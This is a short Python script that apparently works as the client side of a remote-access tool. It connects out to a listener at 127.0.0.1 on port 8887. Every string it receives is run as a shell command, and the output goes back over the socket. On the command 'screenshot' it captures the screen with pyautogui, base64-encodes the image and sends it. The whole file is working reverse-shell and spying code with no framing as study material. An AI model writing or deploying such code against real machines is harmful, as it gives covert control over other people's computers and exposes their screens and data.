import socket
import subprocess
import pyautogui
from datetime import datetime
import base64

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

print("Connecting.....")
while True:
    try:
        s.connect(("127.0.0.1",8887))
        print("Connected")
        break
    except ConnectionRefusedError as e:
        pass

while True:
    cmd = (s.recv(1024)).decode()
    if cmd == "bye":
        break
    elif cmd == "screenshot":
        ##use datetime to create file
        current_datetime = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
        str_current_datetime = str(current_datetime)
        file_name = str_current_datetime+".png"
        
        #saving image in that file 
        pyautogui.screenshot(file_name)
        with open(file_name,"rb") as f:
            imagebytes = f.read()
        
        #encoding image content into thge base64 
        data = base64.b64encode(imagebytes)

        # step 1: send size
        s.send(str(len(data)).encode())

        # step 2: wait for server ready
        s.recv(1024)

        # step 3: send actual data
        s.sendall(data)
        continue

        
    output = subprocess.getoutput(cmd)
    s.send(output.encode())

s.close()